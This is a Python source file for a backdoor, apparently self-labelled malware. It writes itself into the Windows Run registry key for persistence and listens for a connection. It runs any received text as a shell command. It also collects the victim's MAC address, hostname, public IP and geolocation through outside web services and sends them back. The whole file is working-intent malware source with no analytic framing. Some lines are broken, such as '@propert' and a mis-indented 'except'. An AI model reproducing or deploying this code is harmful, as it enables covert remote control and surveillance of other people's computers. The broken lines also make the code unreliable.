import urllib.request
import subprocess
import platform
try:
    import winreg
    win = True
except:
    win = False
import socket
import uuid
import json
import os


class Persistance:
    def __init__(self) -> None:
        if win:
            self.check_reg()

    def add_reg(self):
        try:
            addr = os.getcwd() + "\\revShell_server.exe"
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(
                reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'revShell_server', 0, winreg.REG_SZ, addr)
            winreg.CloseKey(key)
        except:
            pass

    def check_reg(self):
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(
                reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            index = 0
            while 1:
                v = winreg.EnumValue(key, index)
                if 'revShell_server' not in v:
                    index += 1
                    continue
                return True
        except:
            winreg.CloseKey(key)
            self.add_reg()


class CommonData:
    def __init__(self) -> None:
        pass

    @propert
    def system(self):
        try:
            os = platform.system()
            rel = platform.release()
            ver = platform.version()
            return os + "__" + rel + "__" + ver
       except:
            return "null"
     
    @property
    def system1(self):
        try:
            return platform.platform()
        except:
            return "null"
     
     
    @property
    def mac(self):
        try:
            mac = ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
            return mac
        except:
            return "null"

    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return hostname
        except:
            return "null"

    @property
    def public_ip(self):
        try:
            return urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
        except:
            return "null"

    @property
    def location(self):
        try:
            data = urllib.request.urlopen(
                'https://freegeoip.app/json/').read().decode('utf-8')
            data = json.loads(data)
            cuntry_name = data['country_name']
            city = data['city']
            return '%s:%s' % (cuntry_name, city)
        except:
            return "null"

    @property
    def machine(self):
        try:
            return platform.system()
        except:
            return "null"

    @property
    def core(self):
        try:
            return platform.machine()
        except:
            return "null"


class revShell:
    HOST = ("localhost", 5000)
    BUFF_SIZE = 2048

    def __init__(self) -> None:
        p = Persistance()

        self.s = socket.socket(socket.AF_INET,
                               socket.SOCK_STREAM,
                               socket.IPPROTO_TCP)
        self.s.bind(self.HOST)
        self.s.listen()
        print(f"[+] Listening on {str(self.HOST[0])}:{str(self.HOST[1])}")
        self.socket_init()

    def socket_init(self):
        self.client_socket, self.client_address = self.s.accept()
        print(
            f"[+] Accepted connection: {self.client_address[0]}:{self.client_address[1]}")
        self.main()

    def send_msg(self, msg):
        # convert str(msg) into utf8 bytes
        cmd = bytes(f"{msg}\n\n:> ", "utf-8")
        send = self.client_socket.sendall(cmd)
        return send  # returns "None" if succsess

    def recv_msg(self):
        recv = self.client_socket.recv(self.BUFF_SIZE)
        return recv  # returns value in bytes

    def hq(self, msg):
        try:
            if msg[:5] == 'data.':
                data = CommonData()
                if msg[:10] == 'data.mac':
                    self.send_msg(data.mac)
                elif msg[:13] == 'data.hostname':
                    self.send_msg(data.hostname)
                elif msg[:7] == 'data.ip':
                    self.send_msg(data.public_ip)
                elif msg[:13] == 'data.location':
                    self.send_msg(data.location)
                elif msg[:12] == 'data.machine':
                    self.send_msg(data.machine)
                elif msg[:9] == 'data.core':
                    self.send_msg(data.core)
                elif msg[:14] == 'data.system v1':
                    self.send_msg(data.system)
                elif msg[:14] == 'data.system v2':
                    self.send_msg(data.system1)
                elif msg[:9] == 'data.help':
                    self.send_msg("----- HELP -----\n- data.mac             |  Returns machines mac address\n- data.hostname        |  Returns machines hostname\n- data.ip              |  Returns machines ip\n- data.location        |  Returns rough location of machine\n- data.machine         |  Returns OS\n- data.core            |  Returns system core\n- data.system [v1/v2]  |  Returns information about system (1 or 2)\n")
                else:
                    self.send_msg("----- HELP -----\n- data.mac             |  Returns machines mac address\n- data.hostname        |  Returns machines hostname\n- data.ip              |  Returns machines ip\n- data.location        |  Returns rough location of machine\n- data.machine         |  Returns OS\n- data.core            |  Returns system core\n- data.system [v1/v2]  |  Returns information about system (1 or 2)\n")

            else:
                tsk = subprocess.Popen(args=msg, shell=True,
                                       stdin=subprocess.PIPE,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT)
                stdout, stderr = tsk.communicate()
                res = stdout.strip().decode('utf-8')
                if msg[:2] == "cd":
                    if msg[3:] != "":
                        os.chdir(msg[3:])
                        self.send_msg(
                            f'[revShell] *changed dir to {os.getcwd()}*')
                    else:
                        self.send_msg(res)
                elif msg[:4] == "exit":
                    self.client_socket.close()
                    self.socket_init()
                else:
                    self.send_msg(res)
        except Exception as e:
            self.send_msg(f'[revShell] {e}')

    def main(self):
        if self.send_msg('[revShell] You have connected') != None:
            print("[+] Error while connecting")

        while 1:
            try:
                msg = ''
                chunk = self.recv_msg()
                msg += chunk.strip().decode('utf-8')
                self.hq(msg)
            except:
                self.client_socket.close()
                self.socket_init()


if __name__ == "__main__":
    Maleware = revShell()
